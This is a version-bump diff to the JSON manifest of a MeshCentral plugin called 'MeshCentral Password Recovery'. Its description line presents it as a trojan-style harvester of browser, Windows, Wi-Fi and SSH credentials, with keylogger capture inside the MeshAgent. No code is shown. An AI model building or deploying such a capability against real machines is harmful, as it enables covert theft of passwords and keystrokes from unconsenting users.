@@ -1,7 +1,7 @@
 {
   "name": "MeshCentral Password Recovery",
   "shortName": "mcpassrec",
-  "version": "0.1.0",
+  "version": "0.1.1",
   "author": "MeshCentral Password Recovery contributors",
   "description": "Password Recovery tab: trojan-style credential harvest (browser vaults, Windows Credential Manager, Wi-Fi, SSH/PuTTY) plus keylogger capture, with a savable report. Recovery runs natively inside the MeshAgent.",
   "hasAdminPanel": false,
